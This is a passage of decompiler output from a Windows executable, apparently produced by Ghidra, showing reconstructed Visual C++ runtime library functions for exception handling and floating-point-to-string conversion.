  _CallSETranslator((EHExceptionRecord *)0x123,(EHRegistrationNode *)&local_8,(void *)0x0,
                    (void *)0x0,(_s_FuncInfo *)0x0,0,(EHRegistrationNode *)0x0);
                    // WARNING: Could not recover jumptable at 0x0041771f. Too many branches
                    // WARNING: Treating indirect jump as call
  _Var1 = (*local_8)();
  return _Var1;
}



// Library Function - Single Match
//  struct _s_TryBlockMapEntry const * __cdecl _GetRangeOfTrysToCheck(struct _s_FuncInfo const
// *,int,int,unsigned int *,unsigned int *)
// 
// Library: Visual Studio 2008 Release

_s_TryBlockMapEntry * __cdecl
_GetRangeOfTrysToCheck(_s_FuncInfo *param_1,int param_2,int param_3,uint *param_4,uint *param_5)

{
  TryBlockMapEntry *pTVar1;
  uint uVar2;
  uint uVar3;
  uint uVar4;
  uint uVar5;
  
  pTVar1 = param_1->pTryBlockMap;
  uVar5 = param_1->nTryBlocks;
  uVar2 = uVar5;
  uVar3 = uVar5;
  while (uVar4 = uVar2, -1 < param_2) {
    if (uVar5 == 0xffffffff) {
      _inconsistency();
    }
    uVar5 = uVar5 - 1;
    if (((pTVar1[uVar5].tryHigh < param_3) && (param_3 <= pTVar1[uVar5].catchHigh)) ||
       (uVar2 = uVar4, uVar5 == 0xffffffff)) {
      param_2 = param_2 + -1;
      uVar2 = uVar5;
      uVar3 = uVar4;
    }
  }
  uVar5 = uVar5 + 1;
  *param_4 = uVar5;
  *param_5 = uVar3;
  if ((param_1->nTryBlocks < uVar3) || (uVar3 < uVar5)) {
    _inconsistency();
  }
  return pTVar1 + uVar5;
}



// Library Function - Single Match
//  __CreateFrameInfo
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

undefined4 * __cdecl __CreateFrameInfo(undefined4 *param_1,undefined4 param_2)

{
  _ptiddata p_Var1;
  
  *param_1 = param_2;
  p_Var1 = __getptd();
  param_1[1] = p_Var1->_pFrameInfoChain;
  p_Var1 = __getptd();
  p_Var1->_pFrameInfoChain = param_1;
  return param_1;
}



// Library Function - Single Match
//  __IsExceptionObjectToBeDestroyed
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

undefined4 __cdecl __IsExceptionObjectToBeDestroyed(int param_1)

{
  _ptiddata p_Var1;
  int *piVar2;
  
  p_Var1 = __getptd();
  piVar2 = (int *)p_Var1->_pFrameInfoChain;
  while( true ) {
    if (piVar2 == (int *)0x0) {
      return 1;
    }
    if (*piVar2 == param_1) break;
    piVar2 = (int *)piVar2[1];
  }
  return 0;
}



// Library Function - Single Match
//  __FindAndUnlinkFrame
// 
// Library: Visual Studio 2008 Release

void __cdecl __FindAndUnlinkFrame(void *param_1)

{
  void *pvVar1;
  _ptiddata p_Var2;
  void *pvVar3;
  
  p_Var2 = __getptd();
  if (param_1 == p_Var2->_pFrameInfoChain) {
    p_Var2 = __getptd();
    p_Var2->_pFrameInfoChain = *(void **)((int)param_1 + 4);
  }
  else {
    p_Var2 = __getptd();
    pvVar1 = p_Var2->_pFrameInfoChain;
    do {
      pvVar3 = pvVar1;
      if (*(int *)((int)pvVar3 + 4) == 0) {
        _inconsistency();
        return;
      }
      pvVar1 = *(void **)((int)pvVar3 + 4);
    } while (param_1 != *(void **)((int)pvVar3 + 4));
    *(undefined4 *)((int)pvVar3 + 4) = *(undefined4 *)((int)param_1 + 4);
  }
  return;
}



// Library Function - Single Match
//  void * __cdecl _CallCatchBlock2(struct EHRegistrationNode *,struct _s_FuncInfo const *,void
// *,int,unsigned long)
// 
// Libraries: Visual Studio 2005 Release, Visual Studio 2008 Release, Visual Studio 2010 Release

void * __cdecl
_CallCatchBlock2(EHRegistrationNode *param_1,_s_FuncInfo *param_2,void *param_3,int param_4,
                ulong param_5)

{
  void *pvVar1;
  void *local_1c;
  code *local_18;
  uint local_14;
  _s_FuncInfo *local_10;
  EHRegistrationNode *local_c;
  int local_8;
  
  local_14 = DAT_00422044 ^ (uint)&local_1c;
  local_10 = param_2;
  local_8 = param_4 + 1;
  local_18 = CatchGuardHandler;
  local_c = param_1;
  local_1c = ExceptionList;
  ExceptionList = &local_1c;
  pvVar1 = (void *)__CallSettingFrame_12(param_3,param_1,param_5);
  ExceptionList = local_1c;
  return pvVar1;
}



// WARNING: This is an inlined function
// WARNING: Unable to track spacebase fully for stack
// WARNING: Variable defined which should be unmapped: param_1
// Library Function - Single Match
//  __EH_prolog3
// 
// Libraries: Visual Studio 2005, Visual Studio 2008, Visual Studio 2010, Visual Studio 2012

void __cdecl __EH_prolog3(int param_1)

{
  int iVar1;
  undefined4 unaff_EBX;
  undefined4 unaff_ESI;
  undefined4 unaff_EDI;
  undefined4 unaff_retaddr;
  uint auStack_1c [5];
  undefined local_8 [8];
  
  iVar1 = -param_1;
  *(undefined4 *)((int)auStack_1c + iVar1 + 0x10) = unaff_EBX;
  *(undefined4 *)((int)auStack_1c + iVar1 + 0xc) = unaff_ESI;
  *(undefined4 *)((int)auStack_1c + iVar1 + 8) = unaff_EDI;
  *(uint *)((int)auStack_1c + iVar1 + 4) = DAT_00422044 ^ (uint)&param_1;
  *(undefined4 *)((int)auStack_1c + iVar1) = unaff_retaddr;
  ExceptionList = local_8;
  return;
}



// WARNING: This is an inlined function
// WARNING: Unable to track spacebase fully for stack
// WARNING: Variable defined which should be unmapped: param_1
// Library Function - Single Match
//  __EH_prolog3_catch
// 
// Libraries: Visual Studio 2005, Visual Studio 2008, Visual Studio 2010, Visual Studio 2012

void __cdecl __EH_prolog3_catch(int param_1)

{
  int iVar1;
  undefined4 unaff_EBX;
  undefined4 unaff_ESI;
  undefined4 unaff_EDI;
  undefined4 unaff_retaddr;
  uint auStack_1c [5];
  undefined local_8 [8];
  
  iVar1 = -param_1;
  *(undefined4 *)((int)auStack_1c + iVar1 + 0x10) = unaff_EBX;
  *(undefined4 *)((int)auStack_1c + iVar1 + 0xc) = unaff_ESI;
  *(undefined4 *)((int)auStack_1c + iVar1 + 8) = unaff_EDI;
  *(uint *)((int)auStack_1c + iVar1 + 4) = DAT_00422044 ^ (uint)&param_1;
  *(undefined4 *)((int)auStack_1c + iVar1) = unaff_retaddr;
  ExceptionList = local_8;
  return;
}



// WARNING: This is an inlined function
// Library Function - Single Match
//  __EH_epilog3
// 
// Libraries: Visual Studio 2005, Visual Studio 2008, Visual Studio 2010, Visual Studio 2012

void __EH_epilog3(void)

{
  undefined4 *unaff_EBP;
  undefined4 unaff_retaddr;
  
  ExceptionList = (void *)unaff_EBP[-3];
  *unaff_EBP = unaff_retaddr;
  return;
}



// Library Function - Single Match
//  __forcdecpt_l
// 
// Library: Visual Studio 2008 Release

void __cdecl __forcdecpt_l(char *_Buf,_locale_t _Locale)

{
  byte bVar1;
  byte bVar2;
  int iVar3;
  bool bVar4;
  int local_14 [2];
  int local_c;
  char local_8;
  
  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)local_14,_Locale);
  iVar3 = _tolower((int)*_Buf);
  bVar4 = iVar3 == 0x65;
  while (!bVar4) {
    _Buf = (char *)((byte *)_Buf + 1);
    iVar3 = _isdigit((uint)(byte)*_Buf);
    bVar4 = iVar3 == 0;
  }
  iVar3 = _tolower((int)*_Buf);
  if (iVar3 == 0x78) {
    _Buf = (char *)((byte *)_Buf + 2);
  }
  bVar2 = *_Buf;
  *_Buf = ***(byte ***)(local_14[0] + 0xbc);
  do {
    _Buf = (char *)((byte *)_Buf + 1);
    bVar1 = *_Buf;
    *_Buf = bVar2;
    bVar2 = bVar1;
  } while (*_Buf != 0);
  if (local_8 != '\0') {
    *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
  }
  return;
}



// Library Function - Single Match
//  __cropzeros_l
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

void __cdecl __cropzeros_l(char *_Buf,_locale_t _Locale)

{
  char *pcVar1;
  char cVar3;
  int local_14 [2];
  int local_c;
  char local_8;
  char *pcVar2;
  
  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)local_14,_Locale);
  cVar3 = *_Buf;
  if (cVar3 != '\0') {
    do {
      if (cVar3 == ***(char ***)(local_14[0] + 0xbc)) break;
      _Buf = _Buf + 1;
      cVar3 = *_Buf;
    } while (cVar3 != '\0');
  }
  if (*_Buf != '\0') {
    do {
      _Buf = _Buf + 1;
      cVar3 = *_Buf;
      pcVar1 = _Buf;
      if ((cVar3 == '\0') || (cVar3 == 'e')) break;
    } while (cVar3 != 'E');
    do {
      pcVar2 = pcVar1;
      pcVar1 = pcVar2 + -1;
    } while (*pcVar1 == '0');
    if (*pcVar1 == ***(char ***)(local_14[0] + 0xbc)) {
      pcVar1 = pcVar2 + -2;
    }
    do {
      cVar3 = *_Buf;
      pcVar1 = pcVar1 + 1;
      _Buf = _Buf + 1;
      *pcVar1 = cVar3;
    } while (cVar3 != '\0');
  }
  if (local_8 != '\0') {
    *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
  }
  return;
}



// Library Function - Single Match
//  __positive
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

int __cdecl __positive(double *arg)

{
  if (0.0 < *arg != (*arg == 0.0)) {
    return 1;
  }
  return 0;
}



// Library Function - Single Match
//  __fassign_l
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

void __cdecl __fassign_l(int flag,char *argument,char *number,_locale_t param_4)

{
  _CRT_FLOAT local_c;
  undefined4 local_8;
  
  if (flag == 0) {
    FID_conflict___atoflt_l((_CRT_FLOAT *)&flag,number,param_4);
    *(int *)argument = flag;
  }
  else {
    FID_conflict___atoflt_l(&local_c,number,param_4);
    *(float *)argument = local_c.f;
    *(undefined4 *)(argument + 4) = local_8;
  }
  return;
}



// Library Function - Single Match
//  __fassign
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

void __cdecl __fassign(int flag,char *argument,char *number)

{
  __fassign_l(flag,argument,number,(_locale_t)0x0);
  return;
}



// Library Function - Single Match
//  __shift
// 
// Library: Visual Studio 2008 Release

void __shift(void)

{
  char *in_EAX;
  size_t sVar1;
  int unaff_EDI;
  
  if (unaff_EDI != 0) {
    sVar1 = _strlen(in_EAX);
    _memmove(in_EAX + unaff_EDI,in_EAX,sVar1 + 1);
  }
  return;
}



// Library Function - Single Match
//  __forcdecpt
// 
// Library: Visual Studio 2008 Release

void __cdecl __forcdecpt(char *_Buf)

{
  __forcdecpt_l(_Buf,(_locale_t)0x0);
  return;
}



// Library Function - Single Match
//  __cropzeros
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

void __cdecl __cropzeros(char *_Buf)

{
  __cropzeros_l(_Buf,(_locale_t)0x0);
  return;
}



// Library Function - Single Match
//  __cftoe2_l
// 
// Library: Visual Studio 2008 Release

int __cdecl
__cftoe2_l(uint param_1,int param_2,int param_3,int *param_4,char param_5,localeinfo_struct *param_6
          )

{
  undefined *in_EAX;
  int *piVar1;
  errno_t eVar2;
  int iVar3;
  undefined *puVar4;
  undefined *puVar5;
  char *_Dst;
  int iVar6;
  int local_14 [2];
  int local_c;
  char local_8;
  
  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)local_14,param_6);
  if ((in_EAX == (undefined *)0x0) || (param_1 == 0)) {
    piVar1 = __errno();
    iVar6 = 0x16;
  }
  else {
    iVar6 = param_2;
    if (param_2 < 1) {
      iVar6 = 0;
    }
    if (iVar6 + 9U < param_1) {
      if (param_5 != '\0') {
        __shift();
      }
      puVar4 = in_EAX;
      if (*param_4 == 0x2d) {
        *in_EAX = 0x2d;
        puVar4 = in_EAX + 1;
      }
      puVar5 = puVar4;
      if (0 < param_2) {
        puVar5 = puVar4 + 1;
        *puVar4 = *puVar5;
        *puVar5 = *(undefined *)**(undefined4 **)(local_14[0] + 0xbc);
      }
      _Dst = puVar5 + (uint)(param_5 == '\0') + param_2;
      if (param_1 == 0xffffffff) {
        puVar4 = (undefined *)0xffffffff;
      }
      else {
        puVar4 = in_EAX + (param_1 - (int)_Dst);
      }
      eVar2 = _strcpy_s(_Dst,(rsize_t)puVar4,s_e_000_0042002c);
      if (eVar2 == 0) {
        if (param_3 != 0) {
          *_Dst = 'E';
        }
        if (*(char *)param_4[3] != '0') {
          iVar6 = param_4[1] + -1;
          if (iVar6 < 0) {
            iVar6 = -iVar6;
            _Dst[1] = '-';
          }
          if (99 < iVar6) {
            iVar3 = iVar6 / 100;
            iVar6 = iVar6 % 100;
            _Dst[2] = _Dst[2] + (char)iVar3;
          }
          if (9 < iVar6) {
            iVar3 = iVar6 / 10;
            iVar6 = iVar6 % 10;
            _Dst[3] = _Dst[3] + (char)iVar3;
          }
          _Dst[4] = _Dst[4] + (char)iVar6;
        }
        if (((DAT_00425750 & 1) != 0) && (_Dst[2] == '0')) {
          _memmove(_Dst + 2,_Dst + 3,3);
        }
        if (local_8 != '\0') {
          *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
        }
        return 0;
      }
                    // WARNING: Subroutine does not return
      __invoke_watson((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
    }
    piVar1 = __errno();
    iVar6 = 0x22;
  }
  *piVar1 = iVar6;
  __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  if (local_8 != '\0') {
    *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
  }
  return iVar6;
}



// Library Function - Single Match
//  __cftoe_l
// 
// Library: Visual Studio 2008 Release

void __cdecl
__cftoe_l(double *param_1,undefined *param_2,uint param_3,int param_4,int param_5,
         localeinfo_struct *param_6)

{
  int *piVar1;
  size_t _SizeInBytes;
  errno_t eVar2;
  _strflt local_30;
  char local_20 [24];
  uint local_8;
  
  local_8 = DAT_00422044 ^ (uint)&stack0xfffffffc;
  __fltout2((_CRT_DOUBLE)*param_1,&local_30,local_20,0x16);
  if ((param_2 == (undefined *)0x0) || (param_3 == 0)) {
    piVar1 = __errno();
    *piVar1 = 0x16;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  }
  else {
    if (param_3 == 0xffffffff) {
      _SizeInBytes = 0xffffffff;
    }
    else {
      _SizeInBytes = (param_3 - (local_30.sign == 0x2d)) - (uint)(0 < param_4);
    }
    eVar2 = __fptostr(param_2 + (uint)(0 < param_4) + (uint)(local_30.sign == 0x2d),_SizeInBytes,
                      param_4 + 1,&local_30);
    if (eVar2 == 0) {
      __cftoe2_l(param_3,param_4,param_5,&local_30.sign,'\0',param_6);
    }
    else {
      *param_2 = 0;
    }
  }
  ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return;
}



// Library Function - Single Match
//  __cftoe
// 
// Library: Visual Studio 2008 Release

errno_t __cdecl __cftoe(double *_Value,char *_Buf,size_t _SizeInBytes,int _Dec,int _Caps)

{
  errno_t eVar1;
  
  eVar1 = __cftoe_l(_Value,_Buf,_SizeInBytes,_Dec,_Caps,(localeinfo_struct *)0x0);
  return eVar1;
}



// Library Function - Single Match
//  __cftoa_l
// 
// Library: Visual Studio 2008 Release

int __cdecl
__cftoa_l(double *param_1,undefined *param_2,uint param_3,size_t param_4,int param_5,
         localeinfo_struct *param_6)

{
  ushort uVar1;
  int *piVar2;
  size_t _SizeInBytes;
  errno_t eVar3;
  char *pcVar4;
  char *pcVar5;
  uint uVar6;
  uint uVar7;
  uint extraout_ECX;
  uint extraout_ECX_00;
  uint extraout_ECX_01;
  uint uVar8;
  short sVar9;
  char *pcVar10;
  char *pcVar11;
  bool bVar12;
  ulonglong uVar13;
  undefined8 uVar14;
  int iVar15;
  int local_28 [2];
  int local_20;
  char local_1c;
  uint local_18;
  undefined4 local_14;
  uint local_10;
  uint local_c;
  int local_8;
  
  local_18 = 0x3ff;
  local_8 = 0x30;
  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)local_28,param_6);
  if ((int)param_4 < 0) {
    param_4 = 0;
  }
  if ((param_2 == (undefined *)0x0) || (param_3 == 0)) {
    piVar2 = __errno();
    iVar15 = 0x16;
LAB_00417d6a:
    *piVar2 = iVar15;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
    if (local_1c != '\0') {
      *(uint *)(local_20 + 0x70) = *(uint *)(local_20 + 0x70) & 0xfffffffd;
    }
    return iVar15;
  }
  *param_2 = 0;
  if (param_3 <= param_4 + 0xb) {
    piVar2 = __errno();
    iVar15 = 0x22;
    goto LAB_00417d6a;
  }
  local_10 = *(uint *)param_1;
  if ((*(uint *)((int)param_1 + 4) >> 0x14 & 0x7ff) == 0x7ff) {
    if (param_3 == 0xffffffff) {
      _SizeInBytes = 0xffffffff;
    }
    else {
      _SizeInBytes = param_3 - 2;
    }
    eVar3 = __cftoe(param_1,param_2 + 2,_SizeInBytes,param_4,0);
    if (eVar3 != 0) {
      *param_2 = 0;
      if (local_1c == '\0') {
        return eVar3;
      }
      *(uint *)(local_20 + 0x70) = *(uint *)(local_20 + 0x70) & 0xfffffffd;
      return eVar3;
    }
    if (param_2[2] == '-') {
      *param_2 = 0x2d;
      param_2 = param_2 + 1;
    }
    *param_2 = 0x30;
    param_2[1] = ((param_5 == 0) - 1U & 0xe0) + 0x78;
    pcVar4 = _strrchr(param_2 + 2,0x65);
    if (pcVar4 != (char *)0x0) {
      *pcVar4 = ((param_5 == 0) - 1U & 0xe0) + 0x70;
      pcVar4[3] = '\0';
    }
    goto LAB_0041808e;
  }
  if ((*(uint *)((int)param_1 + 4) & 0x80000000) != 0) {
    *param_2 = 0x2d;
    param_2 = param_2 + 1;
  }
  *param_2 = 0x30;
  param_2[1] = ((param_5 == 0) - 1U & 0xe0) + 0x78;
  sVar9 = (-(ushort)(param_5 != 0) & 0xffe0) + 0x27;
  if ((*(uint *)((int)param_1 + 4) & 0x7ff00000) == 0) {
    param_2[2] = 0x30;
    if ((*(uint *)param_1 | *(uint *)((int)param_1 + 4) & 0xfffff) == 0) {
      local_18 = 0;
    }
    else {
      local_18 = 0x3fe;
    }
  }
  else {
    param_2[2] = 0x31;
  }
  pcVar11 = param_2 + 3;
  pcVar4 = param_2 + 4;
  if (param_4 == 0) {
    *pcVar11 = '\0';
  }
  else {
    *pcVar11 = ***(char ***)(local_28[0] + 0xbc);
  }
  if (((*(uint *)((int)param_1 + 4) & 0xfffff) != 0) || (local_c = 0, *(int *)param_1 != 0)) {
    local_10 = 0;
    local_c = 0xf0000;
    do {
      if ((int)param_4 < 1) break;
      uVar13 = __aullshr((byte)local_8,*(uint *)((int)param_1 + 4) & local_c & 0xfffff);
      uVar1 = (short)uVar13 + 0x30;
      if (0x39 < uVar1) {
        uVar1 = uVar1 + sVar9;
      }
      local_8 = local_8 + -4;
      *pcVar4 = (char)uVar1;
      local_10 = local_10 >> 4 | local_c << 0x1c;
      local_c = local_c >> 4;
      pcVar4 = pcVar4 + 1;
      param_4 = param_4 - 1;
    } while (-1 < (short)local_8);
    if ((-1 < (short)local_8) &&
       (uVar13 = __aullshr((byte)local_8,*(uint *)((int)param_1 + 4) & local_c & 0xfffff),
       pcVar10 = pcVar4, 8 < (ushort)uVar13)) {
      while( true ) {
        pcVar5 = pcVar10 + -1;
        if ((*pcVar5 != 'f') && (*pcVar5 != 'F')) break;
        *pcVar5 = '0';
        pcVar10 = pcVar5;
      }
      if (pcVar5 == pcVar11) {
        pcVar10[-2] = pcVar10[-2] + '\x01';
      }
      else if (*pcVar5 == '9') {
        *pcVar5 = (char)sVar9 + ':';
      }
      else {
        *pcVar5 = *pcVar5 + '\x01';
      }
    }
  }
  if (0 < (int)param_4) {
    _memset(pcVar4,0x30,param_4);
    pcVar4 = pcVar4 + param_4;
  }
  if (*pcVar11 == '\0') {
    pcVar4 = pcVar11;
  }
  *pcVar4 = ((param_5 == 0) - 1U & 0xe0) + 0x70;
  uVar13 = __aullshr(0x34,*(uint *)((int)param_1 + 4));
  uVar6 = (uint)(uVar13 & 0x7ff);
  uVar7 = uVar6 - local_18;
  uVar6 = (uint)(uVar6 < local_18);
  uVar8 = -uVar6;
  if (uVar6 == 0) {
    pcVar4[1] = '+';
  }
  else {
    pcVar4[1] = '-';
    bVar12 = uVar7 != 0;
    uVar7 = -uVar7;
    uVar8 = -(uVar8 + bVar12);
  }
  pcVar10 = pcVar4 + 2;
  *pcVar10 = '0';
  pcVar11 = pcVar10;
  if (((int)uVar8 < 0) || (((int)uVar8 < 1 && (uVar7 < 1000)))) {
LAB_0041803d:
    if ((-1 < (int)uVar8) && ((0 < (int)uVar8 || (99 < uVar7)))) goto LAB_00418048;
  }
  else {
    uVar14 = __alldvrm(uVar7,uVar8,1000,0);
    local_14 = (undefined4)((ulonglong)uVar14 >> 0x20);
    *pcVar10 = (char)uVar14 + '0';
    pcVar11 = pcVar4 + 3;
    uVar8 = 0;
    uVar7 = extraout_ECX;
    if (pcVar11 == pcVar10) goto LAB_0041803d;
LAB_00418048:
    uVar14 = __alldvrm(uVar7,uVar8,100,0);
    local_14 = (undefined4)((ulonglong)uVar14 >> 0x20);
    *pcVar11 = (char)uVar14 + '0';
    pcVar11 = pcVar11 + 1;
    uVar8 = 0;
    uVar7 = extraout_ECX_00;
  }
  if ((pcVar11 != pcVar10) || ((-1 < (int)uVar8 && ((0 < (int)uVar8 || (9 < uVar7)))))) {
    uVar14 = __alldvrm(uVar7,uVar8,10,0);
    *pcVar11 = (char)uVar14 + '0';
    pcVar11 = pcVar11 + 1;
    uVar7 = extraout_ECX_01;
  }
  *pcVar11 = (char)uVar7 + '0';
  pcVar11[1] = '\0';
LAB_0041808e:
  if (local_1c != '\0') {
    *(uint *)(local_20 + 0x70) = *(uint *)(local_20 + 0x70) & 0xfffffffd;
  }
  return 0;
}



// Library Function - Single Match
//  __cftof2_l
// 
// Library: Visual Studio 2008 Release

undefined4 __thiscall
__cftof2_l(void *this,int param_1,size_t param_2,char param_3,localeinfo_struct *param_4)

{
  int iVar1;
  int *in_EAX;
  int *piVar2;
  undefined *puVar3;
  undefined4 uVar4;
  int local_14 [2];
  int local_c;
  char local_8;
  
  iVar1 = in_EAX[1];
  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)local_14,param_4);
  if ((this == (void *)0x0) || (param_1 == 0)) {
    piVar2 = __errno();
    uVar4 = 0x16;
    *piVar2 = 0x16;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
    if (local_8 != '\0') {
      *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
    }
  }
  else {
    if ((param_3 != '\0') && (iVar1 - 1U == param_2)) {
      puVar3 = (undefined *)((uint)(*in_EAX == 0x2d) + (iVar1 - 1U) + (int)this);
      *puVar3 = 0x30;
      puVar3[1] = 0;
    }
    if (*in_EAX == 0x2d) {
      *(undefined *)this = 0x2d;
      this = (void *)((int)this + 1);
    }
    if (in_EAX[1] < 1) {
      __shift();
      *(undefined *)this = 0x30;
      puVar3 = (undefined *)((int)this + 1);
    }
    else {
      puVar3 = (undefined *)((int)this + in_EAX[1]);
    }
    if (0 < (int)param_2) {
      __shift();
      *puVar3 = *(undefined *)**(undefined4 **)(local_14[0] + 0xbc);
      iVar1 = in_EAX[1];
      if (iVar1 < 0) {
        if ((param_3 != '\0') || (SBORROW4(param_2,-iVar1) == (int)(param_2 + iVar1) < 0)) {
          param_2 = -iVar1;
        }
        __shift();
        _memset(puVar3 + 1,0x30,param_2);
      }
    }
    if (local_8 != '\0') {
      *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
    }
    uVar4 = 0;
  }
  return uVar4;
}



// Library Function - Single Match
//  __cftof_l
// 
// Library: Visual Studio 2008 Release

void __cdecl
__cftof_l(double *param_1,undefined *param_2,int param_3,size_t param_4,localeinfo_struct *param_5)

{
  int *piVar1;
  size_t _SizeInBytes;
  errno_t eVar2;
  _strflt local_30;
  char local_20 [24];
  uint local_8;
  
  local_8 = DAT_00422044 ^ (uint)&stack0xfffffffc;
  __fltout2((_CRT_DOUBLE)*param_1,&local_30,local_20,0x16);
  if ((param_2 == (undefined *)0x0) || (param_3 == 0)) {
    piVar1 = __errno();
    *piVar1 = 0x16;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  }
  else {
    if (param_3 == -1) {
      _SizeInBytes = 0xffffffff;
    }
    else {
      _SizeInBytes = param_3 - (uint)(local_30.sign == 0x2d);
    }
    eVar2 = __fptostr(param_2 + (local_30.sign == 0x2d),_SizeInBytes,local_30.decpt + param_4,
                      &local_30);
    if (eVar2 == 0) {
      __cftof2_l(param_2,param_3,param_4,'\0',param_5);
    }
    else {
      *param_2 = 0;
    }
  }
  ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return;
}



// Library Function - Single Match
//  __cftog_l
// 
// Library: Visual Studio 2008 Release

void __cdecl
__cftog_l(double *param_1,undefined *param_2,uint param_3,size_t param_4,int param_5,
         localeinfo_struct *param_6)

{
  char *pcVar1;
  int *piVar2;
  errno_t eVar3;
  size_t _SizeInBytes;
  char *pcVar4;
  _strflt local_34;
  int local_24;
  char local_20 [24];
  uint local_8;
  
  local_8 = DAT_00422044 ^ (uint)&stack0xfffffffc;
  __fltout2((_CRT_DOUBLE)*param_1,&local_34,local_20,0x16);
  if ((param_2 == (undefined *)0x0) || (param_3 == 0)) {
    piVar2 = __errno();
    *piVar2 = 0x16;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  }
  else {
    local_24 = local_34.decpt + -1;
    if (param_3 == 0xffffffff) {
      _SizeInBytes = 0xffffffff;
    }
    else {
      _SizeInBytes = param_3 - (local_34.sign == 0x2d);
    }
    eVar3 = __fptostr(param_2 + (local_34.sign == 0x2d),_SizeInBytes,param_4,&local_34);
    if (eVar3 == 0) {
      local_34.decpt = local_34.decpt + -1;
      if ((local_34.decpt < -4) || ((int)param_4 <= local_34.decpt)) {
        __cftoe2_l(param_3,param_4,param_5,&local_34.sign,'\x01',param_6);
      }
      else {
        pcVar1 = param_2 + (local_34.sign == 0x2d);
        if (local_24 < local_34.decpt) {
          do {
            pcVar4 = pcVar1;
            pcVar1 = pcVar4 + 1;
          } while (*pcVar4 != '\0');
          pcVar4[-1] = '\0';
        }
        __cftof2_l(param_2,param_3,param_4,'\x01',param_6);
      }
    }
    else {
      *param_2 = 0;
    }
  }
  ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return;
}



// Library Function - Single Match
//  __cfltcvt_l
// 
// Library: Visual Studio 2008 Release

errno_t __cdecl
__cfltcvt_l(double *arg,char *buffer,size_t sizeInBytes,int format,int precision,int caps,
           _locale_t plocinfo)

{
  errno_t eVar1;
  
  if ((format == 0x65) || (format == 0x45)) {
    eVar1 = __cftoe_l(arg,buffer,sizeInBytes,precision,caps,plocinfo);
  }
  else {
    if (format == 0x66) {
      eVar1 = __cftof_l(arg,buffer,sizeInBytes,precision,plocinfo);
      return eVar1;
    }
    if ((format == 0x61) || (format == 0x41)) {
      eVar1 = __cftoa_l(arg,buffer,sizeInBytes,precision,caps,plocinfo);
    }
    else {
      eVar1 = __cftog_l(arg,buffer,sizeInBytes,precision,caps,plocinfo);
    }
  }
  return eVar1;
}



// Library Function - Single Match
//  __cfltcvt
// 
// Libraries: Visual Studio 2005 Release, Visual Studio 2008 Release, Visual Studio 2010 Release,
// Visual Studio 2012 Release

errno_t __cdecl
__cfltcvt(double *arg,char *buffer,size_t sizeInBytes,int format,int precision,int caps)

{
  errno_t eVar1;
  
  eVar1 = __cfltcvt_l(arg,buffer,sizeInBytes,format,precision,caps,(_locale_t)0x0);
  return eVar1;
}



// Library Function - Single Match
//  __setdefaultprecision
// 
// Library: Visual Studio 2008 Release

void __setdefaultprecision(void)

{
  errno_t eVar1;
  
  eVar1 = __controlfp_s((uint *)0x0,0x10000,0x30000);
  if (eVar1 != 0) {
                    // WARNING: Subroutine does not return
    __invoke_watson((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  }
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address
// Library Function - Single Match
//  __ms_p5_test_fdiv
// 
// Libraries: Visual Studio 2005 Release, Visual Studio 2008 Release

undefined4 __ms_p5_test_fdiv(void)

{
  double dVar1;
  
  dVar1 = _DAT_00420038 - (_DAT_00420038 / _DAT_00420040) * _DAT_00420040;
  if (1.0 < dVar1 != NAN(dVar1)) {
    return 1;
  }
  return 0;
}



// Library Function - Single Match
//  __ms_p5_mp_test_fdiv
// 
// Library: Visual Studio 2008 Release

void __ms_p5_mp_test_fdiv(void)

{
  HMODULE hModule;
  FARPROC pFVar1;
  
  hModule = GetModuleHandleA(s_KERNEL32_00420064);
  if (hModule != (HMODULE)0x0) {
    pFVar1 = GetProcAddress(hModule,s_GAIsProcessorFeaturePresent_00420046 + 2);
    if (pFVar1 != (FARPROC)0x0) {
      (*pFVar1)(0);
      return;
    }
  }
  __ms_p5_test_fdiv();
  return;
}



// Library Function - Single Match
//  public: __thiscall std::bad_exception::bad_exception(char const *)
// 
// Library: Visual Studio 2008 Release

bad_exception * __thiscall std::bad_exception::bad_exception(bad_exception *this,char *param_1)

{
  exception::exception((exception *)this,&param_1);
  *(undefined ***)this = vftable;
  return this;
}



undefined4 * __thiscall FUN_004184b4(void *this,byte param_1)

{
  *(undefined ***)this = std::bad_exception::vftable;
  exception::~exception((exception *)this);
  if ((param_1 & 1) != 0) {
    FUN_0040b579(this);
  }
  return (undefined4 *)this;
}



// Library Function - Single Match
//  ___TypeMatch
// 
// Library: Visual Studio 2008 Release

